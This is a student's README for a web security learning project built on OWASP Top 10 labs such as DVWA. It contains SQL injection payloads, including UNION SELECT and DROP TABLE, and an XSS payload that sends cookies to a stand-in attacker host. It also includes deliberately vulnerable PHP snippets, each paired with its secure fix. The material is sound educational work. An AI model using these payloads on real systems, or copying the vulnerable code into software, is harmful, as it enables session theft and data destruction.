# 🛡️ Web Security Learning Project

> A practical study of common web vulnerabilities, OWASP Top 10, and secure coding principles — conducted in safe, legal testing environments.

---

## 📌 Project Overview

This project documents my hands-on learning journey through **web application security**. Using dedicated testing platforms and intentionally vulnerable applications, I explored how attackers exploit common vulnerabilities and, more importantly, how developers can prevent them. All practice was done in **legal, sandboxed environments only**.

---

## 🛠️ Tools & Environments Used

| Tool / Platform | Purpose |
|----------------|---------|
| **DVWA** (Damn Vulnerable Web App) | Practicing SQL Injection, XSS, and more |
| **OWASP WebGoat** | Guided web security lessons |
| **Burp Suite Community** | Intercepting and analyzing HTTP requests |
| **Browser Dev Tools** | Inspecting client-side behavior |
| **TryHackMe / HackTheBox** | Guided CTF-style web challenges |

---

## 🎯 Objectives

- Understand and exploit common web vulnerabilities in safe environments
- Study all **OWASP Top 10** vulnerability categories
- Learn how to identify vulnerable code and write secure alternatives
- Build a foundation for ethical hacking and secure software development

---

## 🔟 OWASP Top 10 — Studied Vulnerabilities

| # | Vulnerability | Status |
|---|--------------|--------|
| A01 | Broken Access Control | ✅ Studied |
| A02 | Cryptographic Failures | ✅ Studied |
| A03 | Injection (SQLi, Command Injection) | ✅ Practiced |
| A04 | Insecure Design | ✅ Studied |
| A05 | Security Misconfiguration | ✅ Studied |
| A06 | Vulnerable & Outdated Components | ✅ Studied |
| A07 | Identification & Authentication Failures | ✅ Studied |
| A08 | Software & Data Integrity Failures | ✅ Studied |
| A09 | Security Logging & Monitoring Failures | ✅ Studied |
| A10 | Server-Side Request Forgery (SSRF) | ✅ Studied |

---

## 💉 SQL Injection (SQLi)

### What It Is
SQL Injection occurs when user input is inserted directly into a SQL query without proper sanitization, allowing attackers to manipulate database queries.

### Example — Vulnerable Code (PHP)
```php
// ❌ VULNERABLE
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```

### Attack Payload
```sql
' OR '1'='1
' UNION SELECT username, password FROM users --
' DROP TABLE users; --
```

### Secure Code (Parameterized Query)
```php
// ✅ SECURE — Using prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_GET['user']]);
```

### Key Takeaways
- **Never** concatenate user input directly into SQL queries
- Always use **prepared statements** or **parameterized queries**
- Use an **ORM** (e.g., SQLAlchemy, Hibernate) when possible
- Apply **least privilege** — DB users should only have necessary permissions

---

## 🖊️ Cross-Site Scripting (XSS)

### What It Is
XSS allows attackers to inject malicious client-side scripts into web pages viewed by other users.

### Types Practiced

| Type | Description |
|------|-------------|
| **Stored XSS** | Malicious script saved in DB and served to all users |
| **Reflected XSS** | Script reflected off server in a response |
| **DOM-based XSS** | Exploit in client-side JavaScript directly |

### Example — Vulnerable Code
```html
<!-- ❌ VULNERABLE — directly inserting user input -->
<p>Welcome, <?php echo $_GET['name']; ?></p>
```

### Attack Payload
```html
<script>alert('XSS')</script>
<img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
```

### Secure Code
```php
// ✅ SECURE — HTML encoding output
<p>Welcome, <?php echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); ?></p>
```

### Key Takeaways
- Always **encode output** before rendering user data in HTML
- Use a **Content Security Policy (CSP)** header
- Sanitize input using libraries like **DOMPurify** (client-side)
- Set **HttpOnly** and **Secure** flags on cookies

---

## 🚪 Broken Access Control

### What It Is
Users can act outside of their intended permissions — accessing other users' data or admin functions.

### Example
```
# Normal user accessing their profile
GET /user/profile?id=1001

# Attacker changes ID to access another user's data (IDOR)
GET /user/profile?id=1002
```

### Prevention
- Enforce access control checks **server-side** on every request
- Use indirect object references or validate ownership
- Deny by default — only allow what is explicitly permitted

---

## 🔐 Secure Coding Principles Learned

| Principle | Description |
|-----------|-------------|
| **Input Validation** | Validate all input on the server side |
| **Output Encoding** | Encode data before rendering in HTML/JS/SQL |
| **Least Privilege** | Grant only the minimum permissions needed |
| **Defense in Depth** | Layer multiple security controls |
| **Fail Securely** | Handle errors without leaking sensitive info |
| **Security Headers** | CSP, X-Frame-Options, HSTS, etc. |
| **Authentication** | Strong passwords, MFA, secure session handling |

---

## 📁 Repository Structure

```
web-security-project/
│
├── README.md                    # Project documentation (this file)
├── owasp-top10-notes/
│   ├── 01-broken-access-control.md
│   ├── 03-injection.md
│   ├── 07-auth-failures.md
│   └── ...
├── vulnerability-demos/
│   ├── sqli/
│   │   ├── vulnerable-example.php
│   │   └── secure-example.php
│   ├── xss/
│   │   ├── vulnerable-example.html
│   │   └── secure-example.html
│   └── idor/
│       └── notes.md
└── resources/
    └── useful-links.md
```

---

## 🧠 What I Learned

- How the most common web attacks work at a technical level
- The mindset shift between **developer** (build features) and **security researcher** (break features)
- Why input validation alone is not sufficient — output encoding matters equally
- How a single vulnerability can chain into a full compromise
- The value of the **OWASP Top 10** as a developer security checklist

---

## ⚖️ Legal & Ethical Disclaimer

> All vulnerability practice was performed **exclusively** on intentionally vulnerable applications (DVWA, WebGoat) and authorized CTF platforms (TryHackMe, HackTheBox). **No real-world systems, websites, or applications were tested without authorization.** Unauthorized hacking is illegal under the IT Act, 2000 (India) and equivalent laws globally. This project is purely **educational**.

---

## 📚 References & Resources

- [OWASP Top 10 Official](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) *(Free, highly recommended)*
- [DVWA — Damn Vulnerable Web App](https://github.com/digininja/DVWA)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [TryHackMe — Web Fundamentals Path](https://tryhackme.com/path/outline/web)

---

## 👤 Author

**Sachin Kumar**  
Cybersecurity Enthusiast | BCA/B.Sc. Student  
📧 sachinyadav2063@gmail.com  
🔗 [LinkedIn](https://linkedin.com) | [GitHub](https://github.com)

---

⭐ *If you found this helpful, feel free to star the repo!*
